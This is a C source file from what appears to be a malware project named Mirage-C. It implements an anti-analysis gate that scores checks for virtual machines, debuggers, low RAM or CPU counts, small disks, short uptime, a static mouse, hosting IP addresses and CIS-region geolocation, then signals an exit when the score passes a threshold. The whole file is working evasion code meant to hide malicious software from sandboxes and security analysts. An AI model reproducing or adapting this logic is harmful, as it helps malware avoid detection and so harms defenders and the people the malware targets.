/*
 * anti_analysis.c — Weighted scoring gate for anti-analysis for Mirage-C
 *
 * Direct translation of Zig src/evasion/anti_analysis.zig.
 * Aggregates all evasion checks into a weighted score.
 */

#include "anti_analysis.h"
#include "evasion.h"
#include "detection.h"
#include <string.h>
#include "engine.h"
#include "config.h"
#include <stdio.h>

#ifdef ENABLE_ANTI_ANALYSIS

/* ── Run all checks and compute score ────────────────────── */

mirage_analysis_result mirage_anti_analysis_run(void) {
    mirage_analysis_result result;
    memset(&result, 0, sizeof(result));

    /* RAM check: +20 if low, +10 if query failed */
    uint64_t ram = mirage_get_total_physical_ram();
    if (ram != 0) {
        if (ram < VM_MIN_RAM) {
            result.score += 20;
            result.flags.ram_low = 1;
        }
    } else {
        result.score += 10;
    }

    /* CPU core count: +20 if few, +10 if query failed */
    uint8_t cores = mirage_get_cpu_core_count();
    if (cores != 0) {
        if (cores < VM_MIN_CPU_CORES) {
            result.score += 20;
            result.flags.cpu_few = 1;
        }
    } else {
        result.score += 10;
    }

    /* Registry VM indicators: +25 */
    if (mirage_check_registry_vm_indicators()) {
        result.score += 25;
        result.flags.vm_registry = 1;
    }

    /* Timing anomaly: +20 */
    if (mirage_check_timing_anomaly()) {
        result.score += 20;
        result.flags.timing_anomaly = 1;
    }

    /* Debugger: +15 */
    if (mirage_check_debugger()) {
        result.score += 15;
        result.flags.debugger = 1;
    }

    /* Screen resolution: +10 if small */
    mirage_screen_res screen = mirage_check_screen_resolution();
    if (screen.w != 0 || screen.h != 0) {
        if (screen.w < VM_MIN_SCREEN_WIDTH || screen.h < VM_MIN_SCREEN_HEIGHT) {
            result.score += 10;
            result.flags.small_screen = 1;
        }
    }

    /* Disk size: +15 if small (<60 GB), +5 if query failed */
    int disk = mirage_check_disk_size();
    if (disk == 1) {
        result.score += 15;
        result.flags.disk_small = 1;
    } else if (disk == -1) {
        result.score += 5;
    }

    /* Uptime: +15 if low (<30 min), +5 if query failed */
    int uptime = mirage_check_uptime();
    if (uptime == 1) {
        result.score += 15;
        result.flags.uptime_low = 1;
    } else if (uptime == -1) {
        result.score += 5;
    }

    /* Mouse movement: +10 if static, +5 if query failed */
    int mouse = mirage_check_mouse_movement();
    if (mouse == 1) {
        result.score += 10;
        result.flags.mouse_static = 1;
    } else if (mouse == -1) {
        result.score += 5;
    }

    /* Geo block: +20 if >=2 CIS indicators */
    mirage_geo_result geo = mirage_check_geo_block();
    if (geo.matched >= 2) {
        result.score += 20;
        result.flags.geo_cis = 1;
    }

    /* Hosting IP: +15 if hosting, +5 if indeterminate */
    int hosting = mirage_check_hosting_ip();
    if (hosting == 1) {
        result.score += 15;
        result.flags.hosting_ip = 1;
    } else if (hosting == -1) {
        result.score += 5;
    }

    return result;
}

/* ── Should exit? ────────────────────────────────────────── */

int mirage_anti_analysis_should_exit(mirage_analysis_result result) {
    return result.score >= EVASION_SCORE_THRESHOLD ? 1 : 0;
}

/* ── Print result ────────────────────────────────────────── */

void mirage_anti_analysis_print(mirage_analysis_result result) {
    dbg_printf("  Score: %u/%u\n", result.score, EVASION_SCORE_THRESHOLD);

    if (result.flags.ram_low)         dbg_printf("    - ram_low detected\n");
    if (result.flags.cpu_few)         dbg_printf("    - cpu_few detected\n");
    if (result.flags.vm_registry)     dbg_printf("    - vm_registry detected\n");
    if (result.flags.timing_anomaly)  dbg_printf("    - timing_anomaly detected\n");
    if (result.flags.debugger)        dbg_printf("    - debugger detected\n");
    if (result.flags.small_screen)    dbg_printf("    - small_screen detected\n");
    if (result.flags.process_list)    dbg_printf("    - process_list detected\n");
    if (result.flags.disk_small)      dbg_printf("    - disk_small detected\n");
    if (result.flags.uptime_low)      dbg_printf("    - uptime_low detected\n");
    if (result.flags.mouse_static)    dbg_printf("    - mouse_static detected\n");
    if (result.flags.geo_cis)         dbg_printf("    - geo_cis detected\n");
    if (result.flags.hosting_ip)      dbg_printf("    - hosting_ip detected\n");
}

#endif /* ENABLE_ANTI_ANALYSIS */
